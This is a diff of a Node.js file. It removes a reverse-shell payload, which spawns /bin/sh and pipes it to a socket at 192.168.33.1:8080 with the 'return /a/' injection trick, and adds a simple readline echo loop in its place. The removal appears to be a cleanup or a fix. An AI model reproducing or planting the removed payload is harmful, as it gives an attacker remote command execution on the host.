@@ -1,12 +1,19 @@
-(function(){
-    var net = require("net"),
-        cp = require("child_process"),
-        sh = cp.spawn("/bin/sh", []);
-    var client = new net.Socket();
-    client.connect(8080, "192.168.33.1", function(){
-        client.pipe(sh.stdin);
-        sh.stdout.pipe(client);
-        sh.stderr.pipe(client);
-    });
-    return /a/; // Prevents the Node.js application form crashing
-})();
+var readline = require('readline');
+var log = console.log;
+
+var rl = readline.createInterface({
+  input: process.stdin,
+  output: process.stdout
+});
+rl.setPrompt('OHAI> ');
+
+var recursiveAsyncReadLine = function () {
+  rl.question('Command: ', function (answer) {
+    if (answer == 'exit') //we need some base case, for recursion
+      return rl.close(); //closing RL and returning from function.
+    log('Got it! Your answer was: "', answer, '"');
+    recursiveAsyncReadLine(); //Calling this function again to ask new question
+  });
+};
+
+recursiveAsyncReadLine(); //we have to actually start our recursion somehow
